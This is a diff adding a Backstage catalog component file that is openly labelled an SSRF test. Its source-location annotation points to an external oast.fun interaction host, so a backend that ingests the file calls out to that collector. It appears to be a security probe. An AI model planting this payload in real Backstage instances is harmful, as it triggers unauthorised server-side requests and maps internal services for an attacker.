@@ -1,0 +1,18 @@
+apiVersion: backstage.io/v1alpha1
+kind: Component
+metadata:
+  name: backend-ssrf-source
+  title: Backend SSRF via Source Location
+  description: Testing SSRF through source location URL processing
+  annotations:
+    github.com/project-slug: newuserx00/business
+    # Source location - Backend intenta acceder a este repo
+    backstage.io/source-location: url:https://dhqnochyatnqoxlgqsvaoyjq6qoz2mh3f.oast.fun/source-repo
+  tags:
+    - ssrf-test
+    - source-location
+spec:
+  type: service
+  lifecycle: experimental
+  owner: security-team
+  system: ssrf-testing
